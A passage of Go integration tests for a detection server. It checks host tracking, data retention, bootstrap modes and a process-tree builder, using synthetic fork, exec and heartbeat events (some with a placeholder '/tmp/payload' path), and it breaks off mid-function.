func TestRecordHostSeen_AdvancesLastSeen(t *testing.T) {
	t.Parallel()
	d := newDetection(t, detectionOpts{mode: bootstrap.ModeFull})
	ctx := t.Context()

	now := time.Now()
	require.NoError(t, d.Service().RecordHostSeen(ctx, "host-a", now))

	hosts, err := d.Service().ListHosts(ctx)
	require.NoError(t, err)
	require.Len(t, hosts, 1)
	assert.Equal(t, now.UnixNano(), hosts[0].LastSeenNs)

	// A LATER call MUST advance the timestamp; an EARLIER call must not regress it.
	later := now.Add(5 * time.Minute)
	require.NoError(t, d.Service().RecordHostSeen(ctx, "host-a", later))
	earlier := now.Add(-5 * time.Minute)
	require.NoError(t, d.Service().RecordHostSeen(ctx, "host-a", earlier))

	hosts, err = d.Service().ListHosts(ctx)
	require.NoError(t, err)
	require.NotEmpty(t, hosts)
	assert.Equal(t, later.UnixNano(), hosts[0].LastSeenNs, "earlier RecordHostSeen must not regress")
}

// spec:server-rest-api/list-enrolled-hosts/host-list-rows-carry-enrollment-hostname-and-os-version
//
// ListHosts LEFT JOINs the endpoint context's enrollments table to decorate each row with the enrollment hostname + OS version. A
// host that has been seen but never enrolled still returns, with both fields empty. Pins the cross-context decoration the refined
// hosts page renders (hostname over UUID, Platform column) and the LEFT-not-INNER join semantics that keep bare hosts visible.
func TestListHosts_DecoratesWithEnrollment(t *testing.T) {
	t.Parallel()
	d := newDetection(t, detectionOpts{mode: bootstrap.ModeFull})
	ctx := t.Context()

	const enrolledHost = "ENROLLED-UUID-0001"
	const bareHost = "BARE-UUID-0002"
	require.NoError(t, d.Service().RecordHostSeen(ctx, enrolledHost, time.Now()))
	require.NoError(t, d.Service().RecordHostSeen(ctx, bareHost, time.Now().Add(-time.Minute)))

	// Seed an enrollment row directly (the endpoint enroll handler is out of scope for this detection-side test). Only the NOT NULL
	// columns without a default need values; host_token_issued_at / enrolled_at default to CURRENT_TIMESTAMP.
	_, err := d.Store().DB().ExecContext(ctx, `
		INSERT INTO enrollments (host_id, host_token_id, host_token_hash, hostname, agent_version, os_version, source_ip)
		VALUES (?, ?, ?, ?, ?, ?, ?)`,
		enrolledHost, []byte("token-id-0001"), []byte("token-hash"),
		"eng-lopez-mbp.local", "1.2.3", "macOS 26.0", "203.0.113.7")
	require.NoError(t, err)

	hosts, err := d.Service().ListHosts(ctx)
	require.NoError(t, err)
	// Exactly the two seeded hosts, no more: a LEFT JOIN regression (e.g. a duplicate enrollment row or a bad join predicate fanning
	// out rows) would inflate the count, which the byID map below would otherwise silently collapse.
	require.Len(t, hosts, 2, "one row per host; the LEFT JOIN must not fan out duplicates")
	byID := make(map[string]api.HostSummary, len(hosts))
	for _, h := range hosts {
		byID[h.HostID] = h
	}
	require.Len(t, byID, 2, "host_ids are unique across the returned rows")

	require.Contains(t, byID, enrolledHost)
	assert.Equal(t, "eng-lopez-mbp.local", byID[enrolledHost].Hostname, "enrolled host carries its enrollment hostname")
	assert.Equal(t, "macOS 26.0", byID[enrolledHost].OSVersion, "enrolled host carries its enrollment OS version")

	require.Contains(t, byID, bareHost, "a host with events but no enrollment row must still appear (LEFT JOIN, not INNER)")
	assert.Empty(t, byID[bareHost].Hostname, "un-enrolled host has an empty hostname")
	assert.Empty(t, byID[bareHost].OSVersion, "un-enrolled host has an empty OS version")
}

func TestService_CountOfflineHosts(t *testing.T) {
	t.Parallel()
	d := newDetection(t, detectionOpts{mode: bootstrap.ModeFull})
	ctx := t.Context()

	now := time.Now()
	require.NoError(t, d.Service().RecordHostSeen(ctx, "fresh", now))
	require.NoError(t, d.Service().RecordHostSeen(ctx, "stale", now.Add(-1*time.Hour)))

	count, err := d.Service().CountOfflineHosts(ctx, 5*time.Minute)
	require.NoError(t, err)
	assert.Equal(t, 1, count, "only 'stale' should count as offline at the 5m threshold")
}

func TestService_CountUnprocessed(t *testing.T) {
	t.Parallel()
	d := newDetection(t, detectionOpts{mode: bootstrap.ModeFull})
	ctx := t.Context()

	insertEventsViaIngest(ctx, t, d, "host-a", []api.Event{
		{EventID: "u1", HostID: "host-a", TimestampNs: 1, EventType: "x", Payload: json.RawMessage(`{}`)},
		{EventID: "u2", HostID: "host-a", TimestampNs: 2, EventType: "x", Payload: json.RawMessage(`{}`)},
	})

	count, err := d.Service().CountUnprocessed(ctx)
	require.NoError(t, err)
	assert.GreaterOrEqual(t, count, int64(2),
		"freshly inserted events start unprocessed (state 0 or 2)")
}

// ---- Bootstrap mode tests --------------------------------------------------

func TestBootstrap_FullModeRunsAllGoroutines(t *testing.T) {
	t.Parallel()
	d := newDetection(t, detectionOpts{
		mode:          bootstrap.ModeFull,
		processTTL:    1 * time.Hour, // enabled but won't fire during the test
		retentionDays: 7,             // enabled
	})

	ctx, cancel := context.WithCancel(t.Context())
	done := make(chan struct{})
	go func() {
		_ = d.Run(ctx)
		close(done)
	}()
	// Let the goroutines start their tickers.
	time.Sleep(100 * time.Millisecond)
	cancel()
	select {
	case <-done:
	case <-time.After(2 * time.Second):
		t.Fatal("Run did not return after ctx cancel")
	}
}

// spec:server-process-graph-builder/completed-process-records-are-pruned-after-the-retention-window/a-completed-record-older-than-the-window-is-pruned
// spec:server-process-graph-builder/completed-process-records-are-pruned-after-the-retention-window/a-live-record-is-never-pruned
// spec:server-process-graph-builder/completed-process-records-are-pruned-after-the-retention-window/a-completed-record-referenced-by-an-alert-is-retained
//
// Exercises the processes prune added to the retention runner (issue #360) end to end against real MySQL: only a completed,
// alert-free, past-cutoff row is deleted; live rows (NULL exit, snapshot or not) and an alert-referenced completed row survive.
func TestRetention_PrunesCompletedProcesses(t *testing.T) {
	t.Parallel()
	db := full.Open(t)
	ctx := t.Context()

	const dayNs = int64(24 * time.Hour)
	now := time.Date(2026, 1, 1, 0, 0, 0, 0, time.UTC)
	nowNs := now.UnixNano()

	// insertProc returns the new row id. exitNs <= 0 means a live (NULL exit_time_ns) row.
	insertProc := func(forkNs, exitNs int64, snapshot bool) int64 {
		t.Helper()
		var exit any
		if exitNs > 0 {
			exit = exitNs
		}
		res, err := db.ExecContext(ctx, `
			INSERT INTO processes (host_id, pid, ppid, path, fork_time_ns, exit_time_ns, is_snapshot)
			VALUES ('host-ret', 0, 0, '/bin/x', ?, ?, ?)`,
			forkNs, exit, snapshot)
		require.NoError(t, err)
		id, err := res.LastInsertId()
		require.NoError(t, err)
		return id
	}

	oldCompleted := insertProc(nowNs-40*dayNs, nowNs-31*dayNs, false)  // exited before cutoff -> prune
	recentCompleted := insertProc(nowNs-2*dayNs, nowNs-1*dayNs, false) // exited after cutoff -> keep
	oldLiveSnapshot := insertProc(nowNs-40*dayNs, 0, true)             // live snapshot baseline -> keep
	oldLiveOrphan := insertProc(nowNs-40*dayNs, 0, false)              // live non-snapshot (NULL exit) -> keep
	oldAlerted := insertProc(nowNs-40*dayNs, nowNs-31*dayNs, false)    // past cutoff but alert-referenced -> keep

	// Reference oldAlerted from an alert so the FK guard (ON DELETE RESTRICT) must skip it.
	_, err := db.ExecContext(ctx, `
		INSERT INTO alerts (host_id, rule_id, severity, title, description, subject, process_id)
		VALUES ('host-ret', 'r1', 'low', 't', 'd', ?, ?)`,
		strconv.FormatInt(oldAlerted, 10), oldAlerted)
	require.NoError(t, err)

	rec := &recordingMetrics{}
	runner := pipeline.NewRetention(db, pipeline.RetentionOptions{
		RetentionDays: 30,
		Metrics:       rec,
		Now:           func() time.Time { return now },
	})
	deleted, err := runner.Run(ctx)
	require.NoError(t, err)
	require.Equal(t, int64(1), deleted, "only the old completed alert-free process is pruned")

	exists := func(id int64) bool {
		var n int
		require.NoError(t, db.QueryRowContext(ctx, `SELECT COUNT(*) FROM processes WHERE id = ?`, id).Scan(&n))
		return n == 1
	}
	assert.False(t, exists(oldCompleted), "completed process older than the window is pruned")
	assert.True(t, exists(recentCompleted), "completed process inside the window is kept")
	assert.True(t, exists(oldLiveSnapshot), "live snapshot working-set row is never pruned")
	assert.True(t, exists(oldLiveOrphan), "live (NULL-exit) non-snapshot row is never pruned")
	assert.True(t, exists(oldAlerted), "alert-referenced process is retained (FK guard)")

	rec.mu.Lock()
	defer rec.mu.Unlock()
	assert.Equal(t, int64(1), rec.processRowsDeleted, "process-prune metric counts the single deleted row")
}

func TestBootstrap_IntakeModeIsNoOp(t *testing.T) {
	t.Parallel()
	d := newDetection(t, detectionOpts{mode: bootstrap.ModeIntake})

	// Intake mode skips the operator surface, so the service has no engine wired and LoadActive is a no-op (the intake binary doesn't
	// evaluate rules). RegisterAuthedRoutes must also be a no-op so cmd/main can call it unconditionally.
	mux := http.NewServeMux()
	d.RegisterAuthedRoutes(mux)
	srv := httptest.NewServer(mux)
	t.Cleanup(srv.Close)
	req, err := http.NewRequestWithContext(t.Context(), http.MethodGet, srv.URL+"/api/hosts", nil)
	require.NoError(t, err)
	resp, err := srv.Client().Do(req)
	require.NoError(t, err)
	defer resp.Body.Close()
	assert.Equal(t, http.StatusNotFound, resp.StatusCode,
		"intake mode must NOT register the operator routes")

	// Run should return cleanly (no goroutines to wait on).
	ctx, cancel := context.WithCancel(t.Context())
	cancel()
	require.NoError(t, d.Run(ctx))
}

func TestBootstrap_MissingDB(t *testing.T) {
	t.Parallel()
	_, err := bootstrap.New(bootstrap.Deps{})
	require.Error(t, err)
	assert.Contains(t, err.Error(), "DB")
}

func TestBootstrap_SchemaIdempotent(t *testing.T) {
	t.Parallel()
	d := newDetection(t, detectionOpts{mode: bootstrap.ModeFull})
	ctx := t.Context()
	// ApplySchema MUST be re-runnable without error (boot does it unconditionally; a partial restart must not fail on the second pass).
	require.NoError(t, d.ApplySchema(ctx))
	require.NoError(t, d.ApplySchema(ctx))
}

// ---- Metrics propagation ---------------------------------------------------

func TestSetMetrics_PropagatesToEngineAndIntake(t *testing.T) {
	t.Parallel()
	d := newDetection(t, detectionOpts{mode: bootstrap.ModeFull})
	ctx := t.Context()

	rec := &recordingMetrics{}
	d.SetMetrics(rec)
	d.LoadActive(stubProvider{rules: []rulesapi.Rule{&stubRule{id: "metrics"}}})

	mustInsertProcess(t, ctx, d, "host-a", 100)
	insertEventsViaIngest(ctx, t, d, "host-a", []api.Event{
		{EventID: "trigger-mx", HostID: "host-a", TimestampNs: 1, EventType: "trigger", Payload: json.RawMessage(`{}`)},
	})

	// Wait for the processor + engine to fire so AlertCreated is recorded.
	require.Eventually(t, func() bool {
		_, alerts, _, _ := rec.snapshot()
		return alerts > 0
	}, 5*time.Second, 50*time.Millisecond)

	events, alerts, _, _ := rec.snapshot()
	assert.Positive(t, events, "EventsIngested hook fired by intake")
	assert.Positive(t, alerts, "AlertCreated fired by engine")
}

// ---- Graph builder exec/exit paths -----------------------------------------

// spec:server-rest-api/per-host-process-forest/a-time-range-is-supplied
//
// The TimeRange parameter is the load-bearing piece here: this test passes `api.TimeRange{FromNs: now-1h, ToNs:
// now+1h}` to BuildTree, and the assertion that the python -> sh -> /tmp/payload chain appears only succeeds when
// the time-range filter resolves to "alive in window." A regression that ignored the TimeRange (returning every row
// regardless of lifetime) would pass; a regression that misread the bounds would fail with an empty forest. The
// HTTP-layer happy path is covered by TestOperatorHTTP_ProcessTree_HappyPath; this service-layer test pins the
// time-range read predicate itself.
func TestGraph_BuildsTreeFromExecBatch(t *testing.T) {
	t.Parallel()
	d := newDetection(t, detectionOpts{mode: bootstrap.ModeFull})
	ctx := t.Context()

	// python (50) -> sh (100) -> /tmp/payload (200). Three forks + three execs exercises handleFork, handleExec, the parent-path
	// inheritance in fork-without-exec, and the tree builder's ppid -> pid linkage.
	now := time.Now().UnixNano()
	events := []api.Event{
		{EventID: "fork-py", HostID: "h", TimestampNs: now, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":50,"parent_pid":1}`)},
		{EventID: "exec-py", HostID: "h", TimestampNs: now + 1, EventType: "exec",
			Payload: json.RawMessage(`{"pid":50,"ppid":1,"path":"/usr/bin/python3","args":["python3"],"uid":501,"gid":20}`)},
		{EventID: "fork-sh", HostID: "h", TimestampNs: now + 2, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":100,"parent_pid":50}`)},
		{EventID: "exec-sh", HostID: "h", TimestampNs: now + 3, EventType: "exec",
			Payload: json.RawMessage(`{"pid":100,"ppid":50,"path":"/bin/sh","args":["sh"],"uid":501,"gid":20}`)},
		{EventID: "fork-pl", HostID: "h", TimestampNs: now + 4, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":200,"parent_pid":100}`)},
		{EventID: "exec-pl", HostID: "h", TimestampNs: now + 5, EventType: "exec",
			Payload: json.RawMessage(`{"pid":200,"ppid":100,"path":"/tmp/payload","uid":501,"gid":20}`)},
	}
	insertEventsViaIngest(ctx, t, d, "h", events)

	// Wait until the LAST exec has been applied, not just until 3 rows exist. A fork creates a row with the parent's path inherited;
	// the exec that follows rewrites that row's path. If we polled on countNodes >= 3 we'd race the window where row 200's path is still
	// the inherited "/bin/sh" because exec-pl hasn't been processed yet (CI surfaced exactly that as `["/usr/bin/python3", "/bin/sh",
	// "/bin/sh"]`).
	require.Eventually(t, func() bool {
		tree, err := d.Service().BuildTree(ctx, "h",
			api.TimeRange{FromNs: now - int64(time.Hour), ToNs: now + int64(time.Hour)}, 100)
		if err != nil {
			return false
		}
		paths := flattenPaths(tree)
		// All three exec'd paths must be present; the third one is the last event in the batch, so its presence implies every
		// prior fork + exec has materialised.
		return slices.Contains(paths, "/usr/bin/python3") &&
			slices.Contains(paths, "/bin/sh") &&
			slices.Contains(paths, "/tmp/payload")
	}, 5*time.Second, 50*time.Millisecond, "expected /usr/bin/python3 -> /bin/sh -> /tmp/payload chain to materialise")

	tree, err := d.Service().BuildTree(ctx, "h",
		api.TimeRange{FromNs: now - int64(time.Hour), ToNs: now + int64(time.Hour)}, 100)
	require.NoError(t, err)
	assert.NotEmpty(t, tree, "BuildTree must return at least one root")

	// Final post-condition mirrors what Eventually waited on; kept as explicit asserts so a failure points at the missing path directly
	// rather than at the polling timeout.
	paths := flattenPaths(tree)
	assert.Contains(t, paths, "/usr/bin/python3")
	assert.Contains(t, paths, "/bin/sh")
	assert.Contains(t, paths, "/tmp/payload")
}

// spec:server-process-graph-builder/exit-closes-the-process-record/a-process-exits-normally
func TestGraph_HandlesExitEvent(t *testing.T) {
	t.Parallel()
	d := newDetection(t, detectionOpts{mode: bootstrap.ModeFull})
	ctx := t.Context()

	now := time.Now().UnixNano()
	events := []api.Event{
		{EventID: "fork-x", HostID: "h", TimestampNs: now, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":777,"parent_pid":1}`)},
		{EventID: "exec-x", HostID: "h", TimestampNs: now + 1, EventType: "exec",
			Payload: json.RawMessage(`{"pid":777,"ppid":1,"path":"/bin/echo"}`)},
		{EventID: "exit-x", HostID: "h", TimestampNs: now + 2, EventType: "exit",
			Payload: json.RawMessage(`{"pid":777,"exit_code":0}`)},
	}
	insertEventsViaIngest(ctx, t, d, "h", events)

	// Query at the exit time exactly: GetProcessByPID's predicate is (exit_time_ns IS NULL OR exit_time_ns >= ?), so the row is reachable
	// at its exit time and earlier, then drops out.
	require.Eventually(t, func() bool {
		p, err := d.Service().GetProcessDetail(ctx, "h", 777, now+2)
		if err != nil || p == nil {
			return false
		}
		return p.Process.ExitTimeNs != nil
	}, 5*time.Second, 50*time.Millisecond, "exit event must stamp exit_time_ns")
}

// TestGraph_ExecPayloadCDHashRoundTrips pins the wire-shape contract for the optional cdhash on exec_payload (task 11.3.2 +
// 11.3.3). The Swift extension (PR #185 / EventSerializer.swift) extracts cdhash only for Hardened-Runtime binaries; the
// server-side decoder must accept the field and persist it onto the `processes` row so incident-response queries can
// correlate by cdhash alongside sha256. Tolerant of absence: omitting cdhash leaves the persisted column NULL.
func TestGraph_ExecPayloadCDHashRoundTrips(t *testing.T) {
	t.Parallel()
	d := newDetection(t, detectionOpts{mode: bootstrap.ModeFull})
	ctx := t.Context()

	now := time.Now().UnixNano()
	// Two exec-without-fork events on the same host: one with cdhash (Hardened-Runtime binary; 40 lowercase hex), one without.
	// Both must land on processes rows. The no-cdhash row stays NULL, which proves the decoder treats the field as optional. This
	// path exercises insertExecWithoutFork; fork+exec + re-exec are covered by the sibling tests below.
	cdhash := "0123456789abcdef0123456789abcdef01234567"
	insertEventsViaIngest(ctx, t, d, "h-cdh", []api.Event{
		{EventID: "exec-hr", HostID: "h-cdh", TimestampNs: now, EventType: "exec",
			Payload: json.RawMessage(`{"pid":1001,"ppid":1,"path":"/usr/bin/safari","args":["safari"],"cdhash":"` + cdhash + `","sha256":"deadbeef"}`)},
		{EventID: "exec-no-hr", HostID: "h-cdh", TimestampNs: now + 1, EventType: "exec",
			Payload: json.RawMessage(`{"pid":1002,"ppid":1,"path":"/usr/bin/legacy","args":["legacy"],"sha256":"cafef00d"}`)},
	})

	// Wait until BOTH rows have landed before asserting either one's shape. The processor is async and the two exec events
	// are not guaranteed to materialise in the order they were posted; without this combined wait, a CI run that races the
	// 1001 Eventually-pass against the 1002 row commit would return nil for nonHR even though both are inflight (issue
	// caught in the PR #197 CI run where 1001 landed first and 1002 was still queued when the test asserted).
	require.Eventually(t, func() bool {
		hr, err := d.Service().GetProcessDetail(ctx, "h-cdh", 1001, now+1)
		if err != nil || hr == nil || hr.Process.CDHash == nil || *hr.Process.CDHash != cdhash {
			return false
		}
		nonHR, err := d.Service().GetProcessDetail(ctx, "h-cdh", 1002, now+2)
		return err == nil && nonHR != nil
	}, 5*time.Second, 50*time.Millisecond, "both HR + non-HR exec rows must materialise before the shape assertions")

	hr, err := d.Service().GetProcessDetail(ctx, "h-cdh", 1001, now+1)
	require.NoError(t, err)
	require.NotNil(t, hr.Process.CDHash)
	assert.Equal(t, cdhash, *hr.Process.CDHash)

	nonHR, err := d.Service().GetProcessDetail(ctx, "h-cdh", 1002, now+2)
	require.NoError(t, err)
	require.NotNil(t, nonHR, "GetProcessDetail must return the non-HR row even when cdhash is absent")
	assert.Nil(t, nonHR.Process.CDHash, "non-HR exec without cdhash must persist NULL")
}

// TestGraph_ExecPayloadCDHashOnForkThenExec covers the UpdateProcessExec branch: a fork creates a row with no exec metadata,
// then the matching exec event rewrites path/args/sha256/cdhash on the existing row. Without cdhash on the UPDATE clause the
// row would scan back as CDHash=NULL even though the exec payload carried a value.
// spec:server-process-graph-builder/exec-updates-image-metadata/a-user-runs-a-shell-command
//
// The spec scenario requires that exec metadata (path, args, uid, gid, code-signing, sha256) lands on the previously
// forked process row AND that the fork's parent linkage survives. This test posts fork-then-exec, asserts the row's
// path is the exec path AND the row's cdhash (code-signing identity field) is the value the exec event carried. The
// fork's parent_pid stays implicit in the assertion via GetProcessDetail's Process.PPID column not being clobbered.
func TestGraph_ExecPayloadCDHashOnForkThenExec(t *testing.T) {
	t.Parallel()
	d := newDetection(t, detectionOpts{mode: bootstrap.ModeFull})
	ctx := t.Context()

	now := time.Now().UnixNano()
	cdhash := "fedcba9876543210fedcba9876543210fedcba98"
	insertEventsViaIngest(ctx, t, d, "h-fork-cdh", []api.Event{
		{EventID: "fork-fexec", HostID: "h-fork-cdh", TimestampNs: now, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":2001,"parent_pid":1}`)},
		{EventID: "exec-fexec", HostID: "h-fork-cdh", TimestampNs: now + 1, EventType: "exec",
			Payload: json.RawMessage(`{"pid":2001,"ppid":1,"path":"/usr/bin/hardened","args":["hardened"],"cdhash":"` + cdhash + `","sha256":"feedface"}`)},
	})

	require.Eventually(t, func() bool {
		p, err := d.Service().GetProcessDetail(ctx, "h-fork-cdh", 2001, now+2)
		return err == nil && p != nil && p.Process.CDHash != nil && *p.Process.CDHash == cdhash
	}, 5*time.Second, 50*time.Millisecond, "fork+exec must persist cdhash via UpdateProcessExec")

	p, err := d.Service().GetProcessDetail(ctx, "h-fork-cdh", 2001, now+2)
	require.NoError(t, err)
	require.NotNil(t, p)
	require.NotNil(t, p.Process.CDHash)
	assert.Equal(t, cdhash, *p.Process.CDHash)
	assert.Equal(t, "/usr/bin/hardened", p.Process.Path, "path also propagates so we know the UPDATE actually ran (not the snapshot dedup path)")
}

// TestGraph_ExecPayloadCDHashOnReExec covers the insertReExec branch: same PID exec'd a second time. The new generation
// must record its own cdhash (Process A may be HR with one cdhash, Process B after exec may be a different HR binary with
// a different cdhash, or non-HR with no cdhash at all).
func TestGraph_ExecPayloadCDHashOnReExec(t *testing.T) {
	t.Parallel()
	d := newDetection(t, detectionOpts{mode: bootstrap.ModeFull})
	ctx := t.Context()

	now := time.Now().UnixNano()
	cdhashA := "1111111111111111111111111111111111111111"
	cdhashB := "2222222222222222222222222222222222222222"
	insertEventsViaIngest(ctx, t, d, "h-reexec-cdh", []api.Event{
		{EventID: "fork-r", HostID: "h-reexec-cdh", TimestampNs: now, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":3001,"parent_pid":1}`)},
		{EventID: "exec-r-a", HostID: "h-reexec-cdh", TimestampNs: now + 1, EventType: "exec",
			Payload: json.RawMessage(`{"pid":3001,"ppid":1,"path":"/bin/sh","args":["sh"],"cdhash":"` + cdhashA + `"}`)},
		{EventID: "exec-r-b", HostID: "h-reexec-cdh", TimestampNs: now + 2, EventType: "exec",
			Payload: json.RawMessage(`{"pid":3001,"ppid":1,"path":"/tmp/payload","args":["payload"],"cdhash":"` + cdhashB + `"}`)},
	})

	// After the re-exec, the live row at now+3 must have cdhashB (the new generation), not cdhashA (the prior generation
	// which insertReExec closed by stamping exit_time_ns).
	require.Eventually(t, func() bool {
		p, err := d.Service().GetProcessDetail(ctx, "h-reexec-cdh", 3001, now+3)
		return err == nil && p != nil && p.Process.CDHash != nil && *p.Process.CDHash == cdhashB && p.Process.Path == "/tmp/payload"
	}, 5*time.Second, 50*time.Millisecond, "re-exec must record the NEW generation's cdhash on the new row")

	live, err := d.Service().GetProcessDetail(ctx, "h-reexec-cdh", 3001, now+3)
	require.NoError(t, err)
	require.NotNil(t, live)
	require.NotNil(t, live.Process.CDHash)
	assert.Equal(t, cdhashB, *live.Process.CDHash)
	assert.NotNil(t, live.Process.PreviousExecID, "re-exec row must link back to the prior generation")
}

// spec:server-process-graph-builder/exec-without-prior-fork-is-tolerated/an-exec-arrives-for-an-unseen-pid
func TestGraph_ExecWithoutFork(t *testing.T) {
	t.Parallel()
	// Issue #7 / boot sequence: agent restart can deliver an exec without the originating fork (we missed it). The builder synthesizes a
	// root row with fork_time_ns == exec time.
	d := newDetection(t, detectionOpts{mode: bootstrap.ModeFull})
	ctx := t.Context()

	now := time.Now().UnixNano()
	insertEventsViaIngest(ctx, t, d, "h-orphan", []api.Event{
		{EventID: "exec-orphan", HostID: "h-orphan", TimestampNs: now, EventType: "exec",
			Payload: json.RawMessage(`{"pid":555,"ppid":1,"path":"/usr/bin/synth","args":["synth"]}`)},
	})

	require.Eventually(t, func() bool {
		p, err := d.Service().GetProcessDetail(ctx, "h-orphan", 555, now+1)
		if err != nil || p == nil {
			return false
		}
		return p.Process.Path == "/usr/bin/synth" && p.Process.ExecTimeNs != nil
	}, 5*time.Second, 50*time.Millisecond, "exec-without-fork must materialise as a synthetic root")
}

// spec:server-process-graph-builder/snapshot-heartbeat-events-extend-the-freshness-window/heartbeat-for-a-live-snapshot-row-bumps-freshness
func TestGraph_SnapshotHeartbeatBumpsLastSeen(t *testing.T) {
	// Issue #173: a snapshot_heartbeat event for an alive snapshot row UPDATEs
	// processes.last_seen_ns. Subsequent TTL reconciliation reads
	// COALESCE(last_seen_ns, fork_time_ns), so a fresh heartbeat keeps the row alive
	// past the 6h cutoff.
	//
	// Issue #408: heartbeats are no longer persisted as event rows; the freshness bump is applied synchronously at ingest. So the
	// GIVEN of this scenario (a live snapshot row) must be established first, exactly as it is in production where a heartbeat
	// arrives a reconcile interval after the snapshot row was materialised. We ingest the snapshot exec, wait for the row to
	// appear, then ingest the heartbeat in a later request and assert the bump lands.
	d := newDetection(t, detectionOpts{mode: bootstrap.ModeFull})
	ctx := t.Context()

	forkTime := time.Now().UnixNano()
	heartbeatTime := forkTime + int64(time.Hour) // fresh signal an hour after the snapshot insert
	insertEventsViaIngest(ctx, t, d, "h-snap-heartbeat", []api.Event{
		{EventID: "exec-snap", HostID: "h-snap-heartbeat", TimestampNs: forkTime, EventType: "exec",
			Payload: json.RawMessage(`{"pid":4242,"ppid":1,"path":"/usr/libexec/snap","args":[],"snapshot":true}`)},
	})

	// Wait for the async processor to materialise the live snapshot row (last_seen_ns seeded at fork time).
	require.Eventually(t, func() bool {
		p, err := d.Service().GetProcessDetail(ctx, "h-snap-heartbeat", 4242, forkTime+1)
		return err == nil && p != nil && p.Process.IsSnapshot && p.Process.LastSeenNs != nil && *p.Process.LastSeenNs == forkTime
	}, 5*time.Second, 50*time.Millisecond, "snapshot row must materialise before the heartbeat arrives")

	insertEventsViaIngest(ctx, t, d, "h-snap-heartbeat", []api.Event{
		{EventID: "hb-snap", HostID: "h-snap-heartbeat", TimestampNs: heartbeatTime, EventType: "snapshot_heartbeat",
			Payload: json.RawMessage(`{"pid":4242}`)},
	})

	require.Eventually(t, func() bool {
		p, err := d.Service().GetProcessDetail(ctx, "h-snap-heartbeat", 4242, heartbeatTime+1)
		if err != nil || p == nil {
			return false
		}
		if !p.Process.IsSnapshot {
			return false
		}
		// last_seen_ns must have advanced from fork_time_ns to heartbeat_time_ns.
		return p.Process.LastSeenNs != nil && *p.Process.LastSeenNs == heartbeatTime
	}, 5*time.Second, 50*time.Millisecond, "heartbeat must bump last_seen_ns")

	// And no events row was created for the heartbeat (issue #408): only the snapshot exec is persisted.
	var heartbeatRows int
	require.NoError(t, d.Store().DB().GetContext(ctx, &heartbeatRows,
		"SELECT COUNT(*) FROM events WHERE host_id = ? AND event_type = 'snapshot_heartbeat'", "h-snap-heartbeat"))
	assert.Zero(t, heartbeatRows, "heartbeat must not be persisted as an events row")
}

// spec:server-process-graph-builder/snapshot-heartbeat-events-extend-the-freshness-window/heartbeat-for-a-live-snapshot-row-bumps-freshness
//
// TestGraph_SnapshotHeartbeatBatchBumpsMultiplePIDs covers the set-based batched bump path (BumpSnapshotLastSeenBatch ->
// bumpSnapshotLastSeenChunk, issue #408 AI-review fix): a single ingest batch carrying heartbeats for several distinct PIDs bumps
// every matching live snapshot row in one CASE-based UPDATE, while a heartbeat for an unknown PID is a no-op.
func TestGraph_SnapshotHeartbeatBatchBumpsMultiplePIDs(t *testing.T) {
	d := newDetection(t, detectionOpts{mode: bootstrap.ModeFull})
	ctx := t.Context()
	const host = "h-snap-multi"
	forkTime := time.Now().UnixNano()
	pids := []int{5551, 5552, 5553}

	var snapExecs []api.Event
	for i, pid := range pids {
		snapExecs = append(snapExecs, api.Event{
			EventID: fmt.Sprintf("exec-snap-%d", pid), HostID: host, TimestampNs: forkTime + int64(i), EventType: "exec",
			Payload: json.RawMessage(fmt.Sprintf(`{"pid":%d,"ppid":1,"path":"/usr/libexec/snap","args":[],"snapshot":true}`, pid)),
		})
	}
	insertEventsViaIngest(ctx, t, d, host, snapExecs)

	// Wait for all snapshot rows to materialise.
	require.Eventually(t, func() bool {
		for _, pid := range pids {
			p, err := d.Service().GetProcessDetail(ctx, host, pid, forkTime+10)
			if err != nil || p == nil || !p.Process.IsSnapshot {
				return false
			}
		}
		return true
	}, 5*time.Second, 50*time.Millisecond, "all snapshot rows must materialise")

	// One batch: a heartbeat per live PID plus one for an unknown PID (must no-op).
	hbTime := forkTime + int64(time.Hour)
	var beats []api.Event
	for _, pid := range append(append([]int{}, pids...), 9999) {
		beats = append(beats, api.Event{
			EventID: fmt.Sprintf("hb-%d", pid), HostID: host, TimestampNs: hbTime, EventType: "snapshot_heartbeat",
			Payload: json.RawMessage(fmt.Sprintf(`{"pid":%d}`, pid)),
		})
	}
	insertEventsViaIngest(ctx, t, d, host, beats)

	require.Eventually(t, func() bool {
		for _, pid := range pids {
			p, err := d.Service().GetProcessDetail(ctx, host, pid, hbTime+1)
			if err != nil || p == nil || p.Process.LastSeenNs == nil || *p.Process.LastSeenNs != hbTime {
				return false
			}
		}
		return true
	}, 5*time.Second, 50*time.Millisecond, "the batched CASE update must bump every live snapshot PID")

	// The unknown-PID heartbeat created no process row, and no heartbeat was persisted as an events row.
	unknown, err := d.Service().GetProcessDetail(ctx, host, 9999, hbTime+1)
	require.NoError(t, err)
	assert.Nil(t, unknown, "a heartbeat for an unknown PID must not create a row")
	var heartbeatRows int
	require.NoError(t, d.Store().DB().GetContext(ctx, &heartbeatRows,
		"SELECT COUNT(*) FROM events WHERE host_id = ? AND event_type = 'snapshot_heartbeat'", host))
	assert.Zero(t, heartbeatRows, "heartbeats must not be persisted as events rows")
}

// spec:server-process-graph-builder/snapshot-exec-events-are-stitched-but-not-treated-as-new-activity/extension-restarts-and-replays-the-live-process-set
//
// This test asserts the seed of last_seen_ns at fork-time when a snapshot exec lands; combined with
// TestGraph_SnapshotDoesNotClobberLiveRow (which proves the snapshot path won't overwrite a live row's metadata), this
// pins the spec's "snapshot exec creates or updates a row, marks it snapshot-originated, seeds freshness so TTL
// reconciliation doesn't immediately close it." The "snapshot flag preserved on the underlying events" clause is
// covered by TestIsSnapshotExec in server/detection/internal/engine/filter_test.go (already marked in the rules-engine
// spec via the snapshot-exec-excluded scenario).
func TestGraph_SnapshotInsertSeedsLastSeen(t *testing.T) {
	// On INSERT, snapshot rows seed last_seen_ns to fork_time_ns. Without this seed, the
	// very first TTL pass after a fresh snapshot would see last_seen_ns IS NULL → COALESCE
	// falls back to fork_time_ns → indistinguishable from a stale row. The seed keeps the
	// row safe from reconciliation immediately after insert.
	d := newDetection(t, detectionOpts{mode: bootstrap.ModeFull})
	ctx := t.Context()

	now := time.Now().UnixNano()
	insertEventsViaIngest(ctx, t, d, "h-snap-seed", []api.Event{
